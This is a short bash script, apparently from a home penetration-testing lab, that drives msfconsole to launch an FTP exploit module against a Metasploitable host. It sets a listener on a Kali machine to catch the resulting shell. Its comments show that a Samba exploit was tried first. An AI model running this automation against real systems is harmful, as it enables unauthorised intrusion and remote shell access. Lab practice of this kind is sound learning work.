#!/bin/bash

#Ensure Metasploit database is initialized
sudo msfdb init

#Using HereDoc to pass values & params to the msfconsole
#Start Metasploit console

msfconsole -q << EOF

#Set variables to constant values but try to pass values as params later

set RHOSTS   10.0.0.14   # Metasploitable IP
set RPORT    21          # Remote port (Samba 139/445 didn't work, switching to ftp 21)
set LHOST    10.0.0.44   # Kali IP
set LPORT    4444        # Local port
set SRVPORT  8080		 # show options requires this port to be set!!

#Find and select the exploit
#search samba
#search ftp
loadpath /usr/share/metasploit-framework/modules/
#use exploit/multi/samba/usermap_script
#use auxiliary/scanner/http/http_version
use exploit/windows/ftp/open_ftpd_wbem

#Show options and run
#show options
run

EOF
